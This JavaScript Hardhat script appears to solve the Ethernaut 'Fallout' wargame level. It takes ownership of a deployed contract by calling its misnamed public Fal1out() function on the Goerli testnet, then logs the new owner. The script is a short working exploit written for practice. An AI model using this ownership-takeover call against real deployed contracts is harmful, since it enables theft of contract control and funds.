// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
require('dotenv').config({ path: __dirname + '/.env' });

const { ethers } = require("hardhat");

const  FALLOUT_ABI = [
    "function Fal1out() public payable",
    "function owner() public view returns (address)"
];

async function main() {
  [player] = await ethers.getSigners();
  const instance = new ethers.Contract(process.env.FALLOUT_ADDRESS, FALLOUT_ABI, ethers.provider);
  const transactionResponse = await instance.connect(player).Fal1out();
  await transactionResponse.wait();
  console.log("owner is ", await instance.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
// run this script after Fallback contract was deployed
// npx hardhat run scripts/deploy.js --network goerli